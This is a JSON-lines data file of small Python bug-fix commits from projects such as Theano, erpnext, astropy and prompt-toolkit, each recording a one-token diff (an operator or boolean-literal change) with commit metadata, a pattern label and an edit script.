{"project": "nmos-common", "commit_sha": "9249dae759faed3fbe77408cdd1aa5af4ff9120e", "parent_sha": "94d8c9dcf36d4530bd43a85c6defa68fb1d13578", "file_path": "nmoscommon/aggregator.py", "project_url": "https://github.com/bbc/nmos-common", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -254,7 +254,7 @@ class Aggregator(object):\n                 self._mdns_updater.P2P_disable()\n         except Exception as e:\n             self.logger.writeWarning(\"Error re-registering Node: {}\".format(e))\n-            self.aggregator == \"\" # Fallback to prevent us getting stuck if the Reg API issues a 4XX error incorrectly\n+            self.aggregator = \"\"  # Fallback to prevent us getting stuck if the Reg API issues a 4XX error incorrectly\n             return\n \n         # Re-register items that must be ordered\n", "before": "self . aggregator == \"\"", "after": "self . aggregator = \"\"", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 13, 3, 34], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 13, 3, 28], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"string:\\\"\\\"\", 3, 32, 3, 34], 2], [\"Delete\", [\"==:==\", 3, 29, 3, 31]], [\"Delete\", [\"comparison_operator\", 3, 13, 3, 34]]]"}
{"project": "astropy", "commit_sha": "fe6ed3b9ef35bc51a549b49c3e2594e92f964d93", "parent_sha": "2050a6f05cf2529680784bbf6f34acddfc7bd77f", "file_path": "astropy/stats/funcs.py", "project_url": "https://github.com/mirca/astropy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1215,7 +1215,7 @@ def _mpmath_kraft_burrows_nousek(N, B, CL):\n         # Note: For small N, s_max is also close to 0 and root finding\n         # might find the wrong root, thus it is important to handle this\n         # case here and return the analytical answer (s_min = 0).\n-        if (B > N) or (eqn7(0, N, B) >= y_S_max):\n+        if (B >= N) or (eqn7(0, N, B) >= y_S_max):\n             return 0.\n         else:\n             def eqn7ysmax(x):\n", "before": "if ( B > N ) or ( eqn7 ( 0 , N , B ) >= y_S_max ) : return 0. else : def eqn7ysmax ( x ) : ", "after": "if ( B >= N ) or ( eqn7 ( 0 , N , B ) >= y_S_max ) : return 0. else : def eqn7ysmax ( x ) : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 13, 3, 18], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 15, 3, 16]]]"}
{"project": "ehForwarderBot", "commit_sha": "1f00b094e425646df5f77624d8c112edc4bc3e4d", "parent_sha": "cb7cb813c7d309b293094e00766dd2956d60a3c9", "file_path": "plugins/eh_telegram_master/__init__.py", "project_url": "https://github.com/jemxgw/ehForwarderBot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -498,7 +498,7 @@ class TelegramChannel(EFBChannel):\n             channels = self.msg_storage[storage_id]['channels']\n             count = self.msg_storage[storage_id]['count']\n         else:\n-            rfilter = filter or re.compile(filter, re.DOTALL | re.IGNORECASE)\n+            rfilter = filter and re.compile(filter, re.DOTALL | re.IGNORECASE)\n             if filter:\n                 self.logger.debug(\"Filter string: %s\", filter)\n             chats = []\n", "before": "else : rfilter = filter or re . compile ( filter , re . DOTALL | re . IGNORECASE )", "after": "else : rfilter = filter and re . compile ( filter , re . DOTALL | re . IGNORECASE )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 23, 3, 78], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 30, 3, 32]]]"}
{"project": "ansible.inventory", "commit_sha": "14a35b216ff6ceb44f5c91370d92416aed1222c0", "parent_sha": "098f73b9778392bb73d045376cceee52529a72b3", "file_path": "sources/nova.py", "project_url": "https://github.com/forgeservicelab/ansible.inventory", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ def get_ssh_user(server, nova_client):\n             return 'ubuntu'\n         if 'centos' in image_name.lower():\n             return 'cloud-user' if getNumber(image_name[image_name.lower().rfind('centos'):].lower().replace('-', ' '\n-                                    ).replace('_', ' ').split('centos')[1].strip().split()[0]) <= 7 else 'centos'\n+                                    ).replace('_', ' ').split('centos')[1].strip().split()[0]) < 7 else 'centos'\n         if 'debian' in image_name.lower():\n             return 'debian'\n         if 'coreos' in image_name.lower():\n", "before": "return 'cloud-user' if getNumber ( image_name [ image_name . lower ( ) . rfind ( 'centos' ) : ] . lower ( ) . replace ( '-' , ' ' ) . replace ( '_' , ' ' ) . split ( 'centos' ) [ 1 ] . strip ( ) . split ( ) [ 0 ] ) <= 7 else 'centos'", "after": "return 'cloud-user' if getNumber ( image_name [ image_name . lower ( ) . rfind ( 'centos' ) : ] . lower ( ) . replace ( '-' , ' ' ) . replace ( '_' , ' ' ) . split ( 'centos' ) [ 1 ] . strip ( ) . split ( ) [ 0 ] ) < 7 else 'centos'", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 2, 36, 3, 100], [\"<:<\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 96, 3, 98]]]"}
{"project": "Theano", "commit_sha": "3a258042d0ede45ee0663ce8f717206f186af112", "parent_sha": "10b7cb91636395a98cf43edad4117b278f129839", "file_path": "theano/sandbox/cuda/type.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class CudaNdarrayType(Type):\n \n     def __init__(self, broadcastable, name=None, dtype=None):\n-        if dtype != None or dtype != 'float32':\n+        if dtype != None and dtype != 'float32':\n             raise TypeError(self.__class__.__name__+' only support dtype float32 for now.')\n         self.broadcastable = tuple(broadcastable)\n         self.name = name\n", "before": "if dtype != None or dtype != 'float32' : raise TypeError ( self . __class__ . __name__ + ' only support dtype float32 for now.' )", "after": "if dtype != None and dtype != 'float32' : raise TypeError ( self . __class__ . __name__ + ' only support dtype float32 for now.' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 2, 12, 2, 47], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 2, 26, 2, 28]]]"}
{"project": "Theano", "commit_sha": "1ea851e5ceafe7d7c772a94b5eade7068c2b86e0", "parent_sha": "2c6139c618b5bec49020df3f279df9ff11eec8d4", "file_path": "theano/tensor/opt.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -751,7 +751,7 @@ def local_alloc_elemwise(node):\n             no_broad_idx = idx\n             break\n             \n-    assert no_broad_idx>0\n+    assert no_broad_idx>=0\n     assert_op = node.inputs[no_broad_idx]\n     cmp_op = assert_op\n     new = []\n", "before": "assert no_broad_idx > 0", "after": "assert no_broad_idx >= 0", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 26], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 24, 3, 25]]]"}
{"project": "Theano", "commit_sha": "bcedcd7c35cbe3c0929c2bbb6335e15230c4ff32", "parent_sha": "f3b720ea957da99cd52cb4f263297caa781fead9", "file_path": "theano/compile/profiling.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -920,7 +920,7 @@ class ProfileStats(object):\n                     else:\n                         set_idx = list_set.index(DONE_SET)\n                         past_mem = list_mem[set_idx]\n-                        if past_mem > mem_count:\n+                        if past_mem >= mem_count:\n                             list_mem[set_idx] = mem_count\n                         else:\n                             DONE_SET.remove(node)\n", "before": "if past_mem > mem_count : list_mem [ set_idx ] = mem_count else : DONE_SET . remove ( node )", "after": "if past_mem >= mem_count : list_mem [ set_idx ] = mem_count else : DONE_SET . remove ( node )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 28, 3, 48], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 37, 3, 38]]]"}
{"project": "CloseClothes", "commit_sha": "dbced4d4f8da068d70b59574bbd0d7672e2756ce", "parent_sha": "20651f501a198c06ce5ade4e8c05ae036229daf4", "file_path": "train_boundingbox.py", "project_url": "https://github.com/itamar8910/CloseClothes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def gen_XY_data(bbox_json_path, input_shape, rel_img_path, MAX_SAMPLES = None,ve\n     start_time = time.time()\n     print(\"Extracting X, Y data\")\n     for (img_data, index) in zip(bbox_json, range(len(bbox_json))):\n-        if index > MAX_SAMPLES:\n+        if index >= MAX_SAMPLES:\n             break\n         if verbose and index % verbose_steps == 1:\n             delta_t = time.time() - start_time\n", "before": "if index > MAX_SAMPLES : break", "after": "if index >= MAX_SAMPLES : break", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 31], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 18, 3, 19]]]"}
{"project": "oe-alliance-plugins", "commit_sha": "2082eb40092500a0cdf67fd339fcaa4d7d80cf51", "parent_sha": "5800b50d8dbe9ffc18671b51bbfda9516b2e8f2e", "file_path": "GigaBlueVFDControl/src/plugin.py", "project_url": "https://github.com/DvbMedia/oe-alliance-plugins", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ class VFD_Giga:\n \t\tconfig.misc.standbyCounter.addNotifier(standbyCounterChanged, initial_call = False)\n \n def main(menuid):\n-\tif not config.misc.boxtype.value == 'gb800se' or not config.misc.boxtype.value == 'gb800solo':\n+\tif not config.misc.boxtype.value == 'gb800se' and not config.misc.boxtype.value == 'gb800solo':\n \t\treturn [ ]\n \tif menuid != \"system\":\n \t\treturn [ ]\n", "before": "if not config . misc . boxtype . value == 'gb800se' or not config . misc . boxtype . value == 'gb800solo' : return [ ]", "after": "if not config . misc . boxtype . value == 'gb800se' and not config . misc . boxtype . value == 'gb800solo' : return [ ]", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 9, 3, 95], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 48, 3, 50]]]"}
{"project": "nltk", "commit_sha": "4bc5c36747eca7c57452bf0ded4466aed09d73d0", "parent_sha": "bb00528f847596463af2c6b71b187541564b0f27", "file_path": "src/nltk/draw/fsa.py", "project_url": "https://github.com/uda/nltk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -223,7 +223,7 @@ class FSADraw:\n \n     def _make_edge(self, node1, node2, label):\n         # Handle epsilon transitions\n-        if label == nltk.fsa.epsilon:\n+        if label != nltk.fsa.epsilon:\n             edge = _Edge(node1, node2, label, self._canvas)\n         else:\n             edge = _Edge(node1, node2, 'e', self._canvas)\n", "before": "if label == nltk . fsa . epsilon : edge = _Edge ( node1 , node2 , label , self . _canvas ) else : edge = _Edge ( node1 , node2 , 'e' , self . _canvas )", "after": "if label != nltk . fsa . epsilon : edge = _Edge ( node1 , node2 , label , self . _canvas ) else : edge = _Edge ( node1 , node2 , 'e' , self . _canvas )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 37], [\"!=:!=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 18, 3, 20]]]"}
{"project": "erpnext", "commit_sha": "01fab2ae1ce4f00fdb27378db477233133bdc24d", "parent_sha": "6a1c0665bc2b6f0ae72eaeb8c014740e632286e7", "file_path": "erpnext/hr/doctype/salary_slip/test_salary_slip.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class TestSalarySlip(unittest.TestCase):\n \n \t\t# set joinng date in the same month\n \t\tself.make_employee(\"test_employee@salary.com\")\n-\t\tif getdate(nowdate()).day > 15:\n+\t\tif getdate(nowdate()).day >= 15:\n \t\t\tdate_of_joining = getdate(add_days(nowdate(),-10))\n \t\t\trelieving_date = getdate(add_days(nowdate(),-10))\n \t\telif getdate(nowdate()).day < 15 and getdate(nowdate()).day > 5:\n", "before": "if getdate ( nowdate ( ) ) . day > 15 : date_of_joining = getdate ( add_days ( nowdate ( ) , - 10 ) ) relieving_date = getdate ( add_days ( nowdate ( ) , - 10 ) ) elif getdate ( nowdate ( ) ) . day < 15 and getdate ( nowdate ( ) ) . day > 5 : ", "after": "if getdate ( nowdate ( ) ) . day >= 15 : date_of_joining = getdate ( add_days ( nowdate ( ) , - 10 ) ) relieving_date = getdate ( add_days ( nowdate ( ) , - 10 ) ) elif getdate ( nowdate ( ) ) . day < 15 and getdate ( nowdate ( ) ) . day > 5 : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 33], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 29, 3, 30]]]"}
{"project": "erpnext", "commit_sha": "61fb496be6cfbfde428a0a481ffaab06ece24629", "parent_sha": "b628971a80f981ef8962235843763abe3c67a2af", "file_path": "erpnext/hr/doctype/salary_slip/test_salary_slip.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class TestSalarySlip(unittest.TestCase):\n \n \t\t# set joinng date in the same month\n \t\tself.make_employee(\"test_employee@salary.com\")\n-\t\tif getdate(nowdate()).day > 15:\n+\t\tif getdate(nowdate()).day >= 15:\n \t\t\tdate_of_joining = getdate(add_days(nowdate(),-10))\n \t\t\trelieving_date = getdate(add_days(nowdate(),-10))\n \t\telif getdate(nowdate()).day < 15 and getdate(nowdate()).day > 5:\n", "before": "if getdate ( nowdate ( ) ) . day > 15 : date_of_joining = getdate ( add_days ( nowdate ( ) , - 10 ) ) relieving_date = getdate ( add_days ( nowdate ( ) , - 10 ) ) elif getdate ( nowdate ( ) ) . day < 15 and getdate ( nowdate ( ) ) . day > 5 : ", "after": "if getdate ( nowdate ( ) ) . day >= 15 : date_of_joining = getdate ( add_days ( nowdate ( ) , - 10 ) ) relieving_date = getdate ( add_days ( nowdate ( ) , - 10 ) ) elif getdate ( nowdate ( ) ) . day < 15 and getdate ( nowdate ( ) ) . day > 5 : ", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 33], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 29, 3, 30]]]"}
{"project": "erpnext", "commit_sha": "6bbed0297b80984bd2df34977b226615c45c82f8", "parent_sha": "3cae3a5190df8d7e53bf523ba1c05b4a0239199b", "file_path": "erpnext/setup/doctype/sms_settings/sms_settings.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def send_via_gateway(arg):\n \tfor d in arg.get('receiver_list'):\n \t\targs[ss.receiver_parameter] = d\n \t\tstatus = send_request(ss.sms_gateway_url, args)\n-\t\tif status > 200 and status < 300:\n+\t\tif status >= 200 and status < 300:\n \t\t\tsuccess_list.append(d)\n \n \tif len(success_list) > 0:\n", "before": "if status > 200 and status < 300 : success_list . append ( d )", "after": "if status >= 200 and status < 300 : success_list . append ( d )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 18], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 13, 3, 14]]]"}
{"project": "erpnext", "commit_sha": "1ce48e7032070cda0c5f503a7b52a8799dd632d3", "parent_sha": "99e31f97b86a9a29ca4e6a2d4db0e352186ff326", "file_path": "erpnext/patches/v9_0/set_pos_profile_name.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ def execute():\n \tfor pos in frappe.get_all(doctype, filters={'disabled': 0}):\n \t\tdoc = frappe.get_doc(doctype, pos.name)\n \n-\t\tif not doc.user and doc.pos_profile_name: continue\n+\t\tif not doc.user or doc.pos_profile_name: continue\n \n \t\ttry:\n \t\t\tdoc.pos_profile_name = doc.user + ' - ' + doc.company\n", "before": "if not doc . user and doc . pos_profile_name : continue", "after": "if not doc . user or doc . pos_profile_name : continue", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 10, 3, 43], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 19, 3, 22]]]"}
{"project": "erpnext", "commit_sha": "03d1394540b11b7cc7f242c662cbd0d117a883dc", "parent_sha": "c68a940aac30e21347731894ed26ffaf1355e513", "file_path": "erpnext/accounts/report/accounts_receivable_summary/accounts_receivable_summary.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ class AccountsReceivableSummary(ReceivablePayableReport):\n \t\t\tself.filters.report_date) or {}\n \n \t\tfor party, party_dict in iteritems(self.party_total):\n-\t\t\tif party_dict.outstanding <= 0:\n+\t\t\tif party_dict.outstanding == 0:\n \t\t\t\tcontinue\n \n \t\t\trow = frappe._dict()\n", "before": "if party_dict . outstanding <= 0 : continue", "after": "if party_dict . outstanding == 0 : continue", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 7, 3, 34], [\"==:==\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 30, 3, 32]]]"}
{"project": "erpnext", "commit_sha": "8af51e1f900ce49361b5766ef0468ab8e7c16433", "parent_sha": "29c565e0f5c4d3a5c479ccc5b0c3b82b7f14d73d", "file_path": "erpnext/hr/doctype/employee/employee.py", "project_url": "https://github.com/mudux/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class Employee(NestedSet):\n \t\telif self.date_of_retirement and self.date_of_joining and (getdate(self.date_of_retirement) <= getdate(self.date_of_joining)):\n \t\t\tthrow(_(\"Date Of Retirement must be greater than Date of Joining\"))\n \n-\t\telif self.relieving_date and self.date_of_joining and (getdate(self.relieving_date) <= getdate(self.date_of_joining)):\n+\t\telif self.relieving_date and self.date_of_joining and (getdate(self.relieving_date) < getdate(self.date_of_joining)):\n \t\t\tthrow(_(\"Relieving Date must be greater than Date of Joining\"))\n \n \t\telif self.contract_end_date and self.date_of_joining and (getdate(self.contract_end_date) <= getdate(self.date_of_joining)):\n", "before": "elif self . relieving_date and self . date_of_joining and ( getdate ( self . relieving_date ) <= getdate ( self . date_of_joining ) ) : throw ( _ ( \"Relieving Date must be greater than Date of Joining\" ) )", "after": "elif self . relieving_date and self . date_of_joining and ( getdate ( self . relieving_date ) < getdate ( self . date_of_joining ) ) : throw ( _ ( \"Relieving Date must be greater than Date of Joining\" ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 58, 3, 119], [\"<:<\", \"T\"], 1], [\"Delete\", [\"<=:<=\", 3, 87, 3, 89]]]"}
{"project": "AIS-home-assistant", "commit_sha": "0334074a522e20aacf3b4f2b0c746eec45f5619c", "parent_sha": "a3d6972268895b0f5475dc201a543a585b6cbe21", "file_path": "homeassistant/helpers/entity.py", "project_url": "https://github.com/sviete/AIS-home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ class Entity(object):\n         if self.entity_id is not None and \\\n                 self.entity_id.lower() in self._visibility:\n-            return self._visibility[self.entity_id.lower()] is 'hide'\n+            return self._visibility[self.entity_id.lower()] == 'hide'\n         else:\n             return self._hidden\n \n", "before": "return self . _visibility [ self . entity_id . lower ( ) ] is 'hide'", "after": "return self . _visibility [ self . entity_id . lower ( ) ] == 'hide'", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 2, 20, 2, 70], [\"==:==\", \"T\"], 1], [\"Delete\", [\"is:is\", 2, 61, 2, 63]]]"}
{"project": "TheLMA", "commit_sha": "24058623e7296043a78062bb2db2db57db0e50dd", "parent_sha": "b9844551a83eaff103cace39c0d46a63ce4c578f", "file_path": "thelma/renderers.py", "project_url": "https://github.com/helixyte/TheLMA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -284,7 +284,7 @@ class IsoWorklistRenderer(ZippedWorklistRenderer):\n                      include_dummy_output=include_dummy_output)\n         else:\n             raise HTTPBadRequest(\"Shape parameter is missing or unknown.\")\n-        return self._run_tool(tool, always_abort=True)\n+        return self._run_tool(tool, always_abort=False)\n \n     def __create_transfer_worklist_stream(self, resource):\n         entity = resource.get_entity()\n", "before": "return self . _run_tool ( tool , always_abort = True )", "after": "return self . _run_tool ( tool , always_abort = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 37, 3, 54], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 50, 3, 54]]]"}
{"project": "django-password-manager", "commit_sha": "5e7e6c14fa393d7e814556c9b02869d9f3adcd84", "parent_sha": "3aa56b17673850a42e7bae380037eb518d5eb108", "file_path": "pass_manager/utils.py", "project_url": "https://github.com/inforian/django-password-manager", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def check_password_expired(user):\n         # get latest password info\n         latest = user.password_history.latest(\"pk\")\n     except PasswordHistory.DoesNotExist:\n-        return False\n+        return True\n \n     now = datetime.now(tz=pytz.UTC)\n     expiration = latest.timestamp + timedelta(days=expiry)\n", "before": "PasswordHistory . DoesNotExist : return False", "after": "PasswordHistory . DoesNotExist : return True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"type\", 3, 16, 3, 21], [\"true:True\", \"T\"], 0], [\"Delete\", [\"false:False\", 3, 16, 3, 21]]]"}
{"project": "baselines", "commit_sha": "e14e003af09ac1d39be237a629f3462e9ecff936", "parent_sha": "7e505df5361760e1ccf3297e48418fc642658ef1", "file_path": "baselines/deepq/experiments/train_mountaincar.py", "project_url": "https://github.com/simontudo/baselines", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def main():\n         exploration_fraction=0.1,\n         exploration_final_eps=0.1,\n         print_freq=10,\n-        param_noise=True\n+        param_noise=False\n     )\n     print(\"Saving model to mountaincar_model.pkl\")\n     act.save(\"mountaincar_model.pkl\")\n", "before": "param_noise = True", "after": "param_noise = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 25], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 21, 3, 25]]]"}
{"project": "osf.io", "commit_sha": "d165d727405eff729e54bf1a5b759f94bed75fc7", "parent_sha": "b0081ed0273717188abcfd513ac1dc8a98b11340", "file_path": "api/base/serializers.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -422,7 +422,7 @@ class RelationshipField(ser.HyperlinkedIdentityField):\n             # Ignore related_counts for these fields\n             fetched_field = self.parent.fields.get(count_field)\n \n-            hidden = fetched_field and isinstance(fetched_field, HideIfWithdrawal) and getattr(value, 'is_retracted', True)\n+            hidden = fetched_field and isinstance(fetched_field, HideIfWithdrawal) and getattr(value, 'is_retracted', False)\n \n             if not hidden and count_field not in countable_fields:\n                 raise InvalidQueryStringError(\n", "before": "hidden = fetched_field and isinstance ( fetched_field , HideIfWithdrawal ) and getattr ( value , 'is_retracted' , True )", "after": "hidden = fetched_field and isinstance ( fetched_field , HideIfWithdrawal ) and getattr ( value , 'is_retracted' , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 95, 3, 124], [\"false:False\", \"T\"], 5], [\"Delete\", [\"true:True\", 3, 119, 3, 123]]]"}
{"project": "python-prompt-toolkit", "commit_sha": "b5b1a16c8143b3430f7ad6c668c37cab8d919b99", "parent_sha": "027d062def4303cff7cf4a9e9b1cba06e8e18225", "file_path": "prompt_toolkit/interface.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -358,7 +358,7 @@ class CommandLineInterface(object):\n         self.renderer.request_absolute_cursor_position()\n         self._redraw()\n \n-    def run(self, reset_current_buffer=True, pre_run=None):\n+    def run(self, reset_current_buffer=False, pre_run=None):\n", "before": "def run ( self , reset_current_buffer = True , pre_run = None ) : ", "after": "def run ( self , reset_current_buffer = False , pre_run = None ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 19, 3, 44], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 40, 3, 44]]]"}
{"project": "python-prompt-toolkit", "commit_sha": "117eaff27fcd19d2d273239d703f8943a616099c", "parent_sha": "4f6ee1448158a3fbd23fb95e1e79eb56e8f9d1df", "file_path": "prompt_toolkit/key_binding/bindings/completion.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def generate_completions(event):\n         second_tab()\n     else:\n         event.cli.start_completion(insert_common_part=True,\n-                                   select_first=True)\n+                                   select_first=False)\n \n \n def display_completions_like_readline(event):\n", "before": "else : event . cli . start_completion ( insert_common_part = True , select_first = True )", "after": "else : event . cli . start_completion ( insert_common_part = True , select_first = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 36, 3, 53], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 49, 3, 53]]]"}
{"project": "NDN3", "commit_sha": "a6bc5f3a682fba6b7ffd8ac4f565e595bcad0227", "parent_sha": "0dcf7dfa523d087aca6a985f17eabcda1644cc16", "file_path": "create_reg_matrices.py", "project_url": "https://github.com/NeuroTheoryUMD/NDN3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def create_tikhonov_matrix(stim_dims, reg_type, boundary_conditions=None):\n \n     if boundary_conditions is None:\n-        boundary_conditions = [True]*3\n+        boundary_conditions = [False]*3\n     else:\n         if not isinstance(boundary_conditions, list):\n             boundary_conditions = [boundary_conditions]*3\n", "before": "boundary_conditions = [ True ] * 3", "after": "boundary_conditions = [ False ] * 3", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"list\", 2, 31, 2, 37], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 2, 32, 2, 36]]]"}
{"project": "gratipay.com", "commit_sha": "75f03ebe9bfedba7489f81ce61185d17e22dfcc4", "parent_sha": "a98872cf4b26cf37b9fce555ae4acec9efd583c3", "file_path": "gratipay/models/participant.py", "project_url": "https://github.com/haonature/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class Participant(Model, MixinTeam):\n \n     def __ne__(self, other):\n         if not isinstance(other, Participant):\n-            return False\n+            return True\n         return self.username != other.username\n \n     def __repr__(self):\n", "before": "return False", "after": "return True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 25], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 20, 3, 25]]]"}
{"project": "TwitterClient", "commit_sha": "ff95ed697093fb0bbe38fdbfdf11d9e537a07b26", "parent_sha": "e1ed3c02c61efbfa8897215fec4c33ad1bd1b4f8", "file_path": "twt_client/views.py", "project_url": "https://github.com/varesa/TwitterClient", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,6 +48,6 @@ def list_tweets(request):\n         print(\"Cached\")\n \n     tweets = []\n-    for tweet in sorted(Tweet.objects.all(), key=lambda tweet: datetime.datetime.strptime(json.loads(tweet.data)['created_at'], \"%a %b %d %H:%M:%S %z %Y\").timestamp(), reverse=True):\n+    for tweet in sorted(Tweet.objects.all(), key=lambda tweet: datetime.datetime.strptime(json.loads(tweet.data)['created_at'], \"%a %b %d %H:%M:%S %z %Y\").timestamp(), reverse=False):\n         tweets.append(json.loads(tweet.data))\n     return render_to_response('tweets.html', {'tweets':tweets})\n\\ No newline at end of file\n", "before": "for tweet in sorted ( Tweet . objects . all ( ) , key = lambda tweet : datetime . datetime . strptime ( json . loads ( tweet . data ) [ 'created_at' ] , \"%a %b %d %H:%M:%S %z %Y\" ) . timestamp ( ) , reverse = True ) : tweets . append ( json . loads ( tweet . data ) )", "after": "for tweet in sorted ( Tweet . objects . all ( ) , key = lambda tweet : datetime . datetime . strptime ( json . loads ( tweet . data ) [ 'created_at' ] , \"%a %b %d %H:%M:%S %z %Y\" ) . timestamp ( ) , reverse = False ) : tweets . append ( json . loads ( tweet . data ) )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 169, 3, 181], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 177, 3, 181]]]"}
